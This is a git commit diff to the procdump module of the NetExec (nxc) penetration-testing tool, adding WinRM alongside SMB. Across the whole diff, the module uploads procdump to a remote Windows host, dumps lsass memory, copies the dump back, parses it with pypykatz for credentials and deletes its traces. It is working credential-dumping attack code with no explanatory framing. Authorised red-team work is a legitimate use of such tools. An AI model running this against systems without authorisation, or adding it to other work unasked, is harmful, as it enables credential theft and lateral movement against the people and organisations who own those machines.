89d516fd6fd0e9fa0188c0005fe17b7c174d0dbc
SoftAndoWetto <188264635+SoftAndoWetto@users.noreply.github.com>
2026-09-01 15:42:56 +0100

    Add WinRM support to procdump module
    Added support for WinRM protocol in procdump module, allowing file operations and process dumping via WinRM in addition to SMB.
    
    Signed-off-by: SoftAndoWetto <188264635+SoftAndoWetto@users.noreply.github.com>

--- nxc/modules/procdump.py
+++ nxc/modules/procdump.py
@@ -1,5 +1,6 @@
 # prdocdump module for nxc python3
 # thanks to pixis (@HackAndDo) for making it pretty l33t :)
+# WinRM adition to the module by @SoftAndoWetto
 # v0.4
 
 import re
@@ -14,7 +15,7 @@ from datetime import datetime
 class NXCModule:
     name = "procdump"
     description = "Get lsass dump using procdump64 and parse the result with pypykatz"
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb", "winrm"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
@@ -25,8 +26,6 @@ class NXCModule:
         DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = PROCDUMP_PATH)
         """
         self.tmp_dir = "C:\\Windows\\Temp\\"
-        self.share = "C$"
-        self.tmp_share = self.tmp_dir.split(":")[1]
         with open(join(DATA_PATH, "procdump/procdump.exe"), "rb") as f:
             self.procdump_embeded = f.read()
         self.procdump = "procdump.exe"
@@ -50,30 +49,54 @@ class NXCModule:
         if "DIR_RESULT" in module_options:
             self.dir_result = module_options["DIR_RESULT"]
 
+        if context.protocol == "smb":
+            self.share = "C$"
+            self.tmp_share = self.tmp_dir.split(":")[1]
+
     def on_admin_login(self, context, connection):
         if self.useembeded is True:
             with open(self.procdump_path + self.procdump, "wb") as procdump:
                 procdump.write(self.procdump_embeded)
 
         context.log.display(f"Copy {self.procdump_path + self.procdump} to {self.tmp_dir}")
-        with open(self.procdump_path + self.procdump, "rb") as procdump:
+        if context.protocol == "smb":
+            with open(self.procdump_path + self.procdump, "rb") as procdump:
+                try:
+                    connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)
+                    context.log.success(f"Created file {self.procdump} on the \\\\{self.share}{self.tmp_share}")
+                except Exception as e:
+                    context.log.fail(f"Error writing file to share {self.share}: {e}")
+        elif context.protocol == "winrm":
             try:
-                connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)
-                context.log.success(f"Created file {self.procdump} on the \\\\{self.share}{self.tmp_share}")
+                connection.conn.copy(self.procdump_path + self.procdump, self.tmp_dir + self.procdump)
+                context.log.success(f"Created file {self.procdump} on {self.tmp_dir}")
             except Exception as e:
-                context.log.fail(f"Error writing file to share {self.share}: {e}")
+                context.log.fail(f"Error uploading file to {self.tmp_dir}: {e}")
 
         # get pid lsass
         context.log.display("Getting lsass PID")
-        p = connection.execute('tasklist /v /fo csv | findstr /i "lsass"', True)
-        if not p:
-            context.log.fail("Failed getting lsass.exe PID")
-            self.delete_procdump_binary(connection, context)
-            return
-        pid = p.split(",")[1][1:-1]
-        command = f"{self.tmp_dir}{self.procdump} -accepteula -ma {pid} {self.tmp_dir}%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
+        if context.protocol == "smb":
+            p = connection.execute('tasklist /v /fo csv | findstr /i "lsass"', True)
+            if not p:
+                context.log.fail("Failed getting lsass.exe PID")
+                self.delete_procdump_binary(connection, context)
+                return
+            pid = p.split(",")[1][1:-1]
+            command = f"{self.tmp_dir}{self.procdump} -accepteula -ma {pid} {self.tmp_dir}%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
+        elif context.protocol == "winrm":
+            p = connection.execute("(Get-Process lsass).Id", True, shell_type="powershell")
+            if not p:
+                context.log.fail("Failed getting lsass.exe PID")
+                self.delete_procdump_binary(connection, context)
+                return
+            pid = p.strip()
+            command = f'& "{self.tmp_dir}{self.procdump}" -accepteula -ma {pid} "{self.tmp_dir}$env:COMPUTERNAME-$env:PROCESSOR_ARCHITECTURE-$env:USERDOMAIN.dmp"'
+
         context.log.display(f"Executing command {command}")
-        p = connection.execute(command, True)
+        if context.protocol == "smb":
+            p = connection.execute(command, True)
+        elif context.protocol == "winrm":
+            p = connection.execute(command, True, shell_type="powershell")
 
         if "Dump 1 complete" not in p:
             context.log.fail("Process lsass.exe error while dumping, try with verbose")
@@ -92,20 +115,34 @@ class NXCModule:
 
             context.log.display(f"Copy {machine_name} to host")
 
-            with open(abspath(join(self.dir_result, machine_name)), "wb+") as dump_file:
+            if context.protocol == "smb":
+                with open(abspath(join(self.dir_result, machine_name)), "wb+") as dump_file:
+                    try:
+                        connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
+                        context.log.success(f"Dumpfile of lsass.exe was transferred to {abspath(join(self.dir_result, machine_name))}")
+                    except Exception as e:
+                        context.log.fail(f"Error while get file: {e}")
+            elif context.protocol == "winrm":
                 try:
-                    connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
+                    connection.conn.fetch(self.tmp_dir + machine_name, abspath(join(self.dir_result, machine_name)))
                     context.log.success(f"Dumpfile of lsass.exe was transferred to {abspath(join(self.dir_result, machine_name))}")
                 except Exception as e:
                     context.log.fail(f"Error while get file: {e}")
 
             self.delete_procdump_binary(connection, context)
 
-            try:
-                connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
-                context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
-            except Exception as e:
-                context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
+            if context.protocol == "smb":
+                try:
+                    connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
+                    context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
+                except Exception as e:
+                    context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
+            elif context.protocol == "winrm":
+                try:
+                    connection.execute(f'Remove-Item -Path "{self.tmp_dir + machine_name}" -Force', True, shell_type="powershell")
+                    context.log.success(f"Deleted lsass.dmp file on {self.tmp_dir}")
+                except Exception as e:
+                    context.log.fail(f"Error deleting lsass.dmp file on {self.tmp_dir}: {e}")
 
             with open(abspath(join(self.dir_result, machine_name)), "rb") as dump:
                 try:
@@ -151,8 +188,15 @@ class NXCModule:
                     context.log.fail("Error openning dump file", str(e))
 
     def delete_procdump_binary(self, connection, context):
-        try:
-            connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
-            context.log.success(f"Deleted procdump file on the {self.share} share")
-        except Exception as e:
-            context.log.fail(f"Error deleting procdump file on share {self.share}: {e}")
+        if context.protocol == "smb":
+            try:
+                connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
+                context.log.success(f"Deleted procdump file on the {self.share} share")
+            except Exception as e:
+                context.log.fail(f"Error deleting procdump file on share {self.share}: {e}")
+        elif context.protocol == "winrm":
+            try:
+                connection.execute(f'Remove-Item -Path "{self.tmp_dir + self.procdump}" -Force', True, shell_type="powershell")
+                context.log.success(f"Deleted procdump file on {self.tmp_dir}")
+            except Exception as e:
+                context.log.fail(f"Error deleting procdump file on {self.tmp_dir}: {e}")
